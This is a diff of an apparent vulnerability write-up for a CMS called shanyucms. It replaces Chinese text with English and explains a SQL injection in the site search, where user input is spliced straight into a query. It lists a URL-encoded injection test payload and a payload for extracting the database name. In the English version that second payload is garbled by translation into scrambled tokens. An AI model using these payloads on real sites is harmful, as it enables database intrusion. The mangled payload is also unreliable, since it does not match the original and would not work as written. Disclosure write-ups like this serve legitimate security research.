@@ -25,14 +25,22 @@ public function index($key='') {
 This code is the implementation code of the foreground content search function. The function judges the submitted search parameters. When the search value is not empty, the parameters entered by the user are directly splicing into the SQL statement without parameter checking and filtering, resulting in SQL injection.
 
 
-1.	在网站首页的搜索功能中输入参数进行搜索
+1. Enter parameters in the search function on the homepage
 
 
- 
-点击搜索后将跳转到搜索功能模块
- 
-SQL注入payload：%%27%20and%201=1%20and%20%20%27%%27=%27
-获取数据库名：
-%%27%20and%201=if(database()%20like%20%27shanyucms%27,1,0)%20and%20%20%27%%27=%27
+
+
+
+
+
+Clicking Search will take you to search function module
+
+
+
+SQL injection payload: %%27%20and%201=1%20and%20%20%27%%27=%27
+
+Get the database name:
+
+20 and 27% % % % 201 = the if (database () % 20 like 20% % 27 shanyucms % 27, 0) % 20 and 20% 20% % 27% % 27 = % 27
  
  
